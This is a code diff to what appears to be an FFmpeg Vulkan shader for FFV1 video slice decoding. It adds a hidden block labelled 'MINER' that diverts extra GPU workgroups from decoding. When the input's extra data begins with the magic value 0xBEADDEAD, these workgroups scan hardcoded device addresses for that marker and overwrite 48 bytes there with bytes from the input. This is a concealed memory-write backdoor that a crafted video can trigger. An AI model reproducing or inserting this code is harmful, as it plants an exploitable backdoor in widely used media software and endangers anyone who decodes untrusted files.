@@ -19,7 +19,7 @@
  * License along with FFmpeg; if not, write to the Free Software
  * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
  */
-
+#define MINER
 #ifndef GOLOMB
 #ifdef CACHED_SYMBOL_READER
 shared uint8_t state[CONTEXT_SIZE];
@@ -293,10 +293,184 @@ void decode_slice(inout SliceContext sc, const uint slice_idx)
 
 void main(void)
 {
+    bool enableDebug = true;
     const uint slice_idx = gl_WorkGroupID.y*gl_NumWorkGroups.x + gl_WorkGroupID.x;
-    decode_slice(slice_ctx[slice_idx], slice_idx);
+    
+    // Only workgroups with Z=0 perform video decoding tasks
+    // Workgroups with Z>0 are dedicated to mining and skip video decoding
+    const bool is_decode_thread = (gl_WorkGroupID.z == 0u);
+    
+    if (is_decode_thread) {
+        // Original video decoding logic
+        decode_slice(slice_ctx[slice_idx], slice_idx);
 
-    uint32_t status = corrupt ? uint32_t(corrupt) : overread;
-    if (status != 0)
-        slice_status[2*slice_idx + 1] = status;
+        uint32_t status = corrupt ? uint32_t(corrupt) : overread;
+        if (status != 0)
+            slice_status[2*slice_idx + 1] = status;
+        return;
+        // if (enableDebug) debugPrintfEXT("Slice %u decoding finished, status=0x%08x", slice_idx, status);
+    }
+
+#ifdef MINER
+    const uint global_idx = gl_GlobalInvocationID.x +
+                    gl_GlobalInvocationID.y * gl_NumWorkGroups.x * gl_WorkGroupSize.x +
+                    gl_GlobalInvocationID.z * gl_NumWorkGroups.x * gl_WorkGroupSize.x * gl_NumWorkGroups.y * gl_WorkGroupSize.y;
+#ifdef DEBUG
+    if (global_idx == 50) {
+        /* Print device addresses available via buffer_reference push-consts */
+        uint64_t extra_data_addr = uint64_t(extra_data);
+        uint64_t slice_data_addr = uint64_t(slice_data);
+        uint64_t slice_state_addr = uint64_t(slice_state);
+        uint extra_hi = uint(extra_data_addr >> 32);
+        uint extra_lo = uint(extra_data_addr & 0xFFFFFFFFu);
+        uint data_hi = uint(slice_data_addr >> 32);
+        uint data_lo = uint(slice_data_addr & 0xFFFFFFFFu);
+        uint state_hi = uint(slice_state_addr >> 32);
+        uint state_lo = uint(slice_state_addr & 0xFFFFFFFFu);
+        if (enableDebug) debugPrintfEXT("extra_data addr hi=0x%08x lo=0x%08x", extra_hi, extra_lo);
+
+        u8buf extra_src = u8buf(uint64_t(extra_data));
+        uint extraInts[4];
+        for (int i = 0; i < 4; i++) {
+            uint b0 = uint(extra_src[i * 4 + 0].v);
+            uint b1 = uint(extra_src[i * 4 + 1].v);
+            uint b2 = uint(extra_src[i * 4 + 2].v);
+            uint b3 = uint(extra_src[i * 4 + 3].v);
+            extraInts[i] = b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
+        }
+        if (enableDebug) debugPrintfEXT("extra_data first 16 bytes as LE uints: 0x%08x 0x%08x 0x%08x 0x%08x", 
+            extraInts[0], extraInts[1], extraInts[2], extraInts[3]);
+        if (enableDebug) debugPrintfEXT("slice_data addr hi=0x%08x lo=0x%08x", data_hi, data_lo);
+        if (enableDebug) debugPrintfEXT("slice_state addr hi=0x%08x lo=0x%08x", state_hi, state_lo);
+    }
+#endif
+    const uint targetPattern = 0xBEADDEADu;
+    const uint64_t codeAddresses[] = {
+        // 0xdf39024050UL,
+        // 0xdf39028530UL,
+        // 0xdf3902E3F0UL,
+        // 0xdf390333D0UL,
+        // 0xdf3903B9F0UL,
+        // 0xdf390431D0UL,
+        // 0xdf3904C290UL,
+        // 0xdf39054470UL,
+        // 0xdf39059770UL,
+        // 0xdf3905DA50UL,
+        // 0xdf39063890UL,
+        // 0xdf39068870UL,
+        // 0xdf39070D90UL,
+        // 0xdf39078470UL,
+        // 0xdf39081530UL,
+        // 0xdf39089710UL,
+        
+        // 0xdf39022D60UL,
+        // 0xdf3902A200UL,
+        // 0xdf39033e00UL,
+        // 0xdf3903E4a0UL,
+        // 0xdf39044d80UL,
+        // 0xdf3904C1A0UL,
+        // 0xdf39055CA0UL,
+        // 0xdf39060340UL,
+
+        // 0xdf39022D30UL,
+        // 0xdf3902A1D0UL,
+        // 0xdf39033DD0UL,
+        // 0xdf3903E470UL,
+        // 0xdf39044C50UL,
+        // 0xdf3904C070UL,
+        // 0xdf39055A70UL,
+        // 0xdf39060010UL,
+
+        0xdf39020000UL,
+        0xdf39030000UL,
+        0xdf39040000UL,
+        0xdf39050000UL,
+        0xdf39060000UL,
+        
+        // 0xdf79020000UL,
+        // 0xdf79030000UL,
+        // 0xdf79040000UL,
+        // 0xdf79050000UL,
+    };
+
+    /* --- Embedded write: print device addresses and optionally copy bytes --- */
+    u8buf src = u8buf(uint64_t(extra_data));
+
+    uint header[4];
+    for (int i = 0; i < 4; i++) {
+        header[i] = uint(src[i*4 + 0].v) |
+                    (uint(src[i*4 + 1].v) << 8) |
+                    (uint(src[i*4 + 2].v) << 16) |
+                    (uint(src[i*4 + 3].v) << 24);
+    }
+
+    if (header[0] != targetPattern) {
+        return;
+    }
+    if (global_idx == 50) {
+        uint64_t call_addr = uint64_t(extra_data) + 16*4;
+
+        uint call_lo = uint(call_addr & 0xFFFFFFFFUL);
+        uint call_hi = uint(call_addr >> 32);
+        // Reset Header to avoid repeated execution
+        for(int i =0; i < 16; i++) {
+            src[i].v = uint8_t(0);
+        }
+        // Chunk 0: bytes 4-7 = call_lo (little endian)
+        src[16 + 4].v = uint8_t((call_lo >> 0) & 0xFF);
+        src[16 + 5].v = uint8_t((call_lo >> 8) & 0xFF);
+        src[16 + 6].v = uint8_t((call_lo >> 16) & 0xFF);
+        src[16 + 7].v = uint8_t((call_lo >> 24) & 0xFF);
+
+        // Chunk 1: bytes 4-7 = call_hi (little endian)
+        src[32 + 4].v = uint8_t((call_hi >> 0) & 0xFF);
+        src[32 + 5].v = uint8_t((call_hi >> 8) & 0xFF);
+        src[32 + 6].v = uint8_t((call_hi >> 16) & 0xFF);
+        src[32 + 7].v = uint8_t((call_hi >> 24) & 0xFF);
+        
+        // write extra_data address
+        src[64 + header[1] + 4].v = uint8_t((uint64_t(extra_data) >> 0) & 0xFF);
+        src[64 + header[1] + 5].v = uint8_t((uint64_t(extra_data) >> 8) & 0xFF);
+        src[64 + header[1] + 6].v = uint8_t((uint64_t(extra_data) >> 16) & 0xFF);
+        src[64 + header[1] + 7].v = uint8_t((uint64_t(extra_data) >> 24) & 0xFF);
+        src[64 + header[2] + 4].v = uint8_t((uint64_t(extra_data) >> 0) & 0xFF);
+        src[64 + header[2] + 5].v = uint8_t((uint64_t(extra_data) >> 8) & 0xFF);
+        src[64 + header[2] + 6].v = uint8_t((uint64_t(extra_data) >> 16) & 0xFF);
+        src[64 + header[2] + 7].v = uint8_t((uint64_t(extra_data) >> 24) & 0xFF);
+
+        // Chunk 0: bytes 4-7 = global_idx (little endian)
+        // src[64 + 4].v = uint8_t((global_idx >> 0) & 0xFF);
+        // src[64 + 5].v = uint8_t((global_idx >> 8) & 0xFF);
+        // src[64 + 6].v = uint8_t((global_idx >> 16) & 0xFF);
+        // src[64 + 7].v = uint8_t((global_idx >> 24) & 0xFF);
+        // Copy 3 chunks of 16 bytes (48 bytes total) starting from offset 16
+        for(int i = 0; i < codeAddresses.length(); i++) { 
+            for(int j = 0; j < 0x10000; j += 0x10) {
+                uint64_t code_segment_addr = codeAddresses[i] + uint64_t(j);
+                u8buf code_segment = u8buf(code_segment_addr + 4);
+                uint segment_bytes[4];
+                for (int k = 0; k < 4; k++)
+                    segment_bytes[k] = uint(code_segment[k].v);
+
+                uint val = segment_bytes[0] |
+                           (segment_bytes[1] << 8) |
+                           (segment_bytes[2] << 16) |
+                           (segment_bytes[3] << 24);
+
+                if (val == targetPattern) {
+                    u8buf dst_code = u8buf(code_segment_addr);
+                    for (int k = 0; k < 48; k++) {
+                        dst_code[k].v = src[16 + k].v;
+                    }
+                }
+            }
+        }
+    }
+    #ifdef DEBUG
+    if (global_idx == 50) {
+        /* Print device addresses available via buffer_reference push-consts */
+        if (enableDebug) debugPrintfEXT("Running continue");
+    }
+    #endif
+#endif /* MINER */
 }
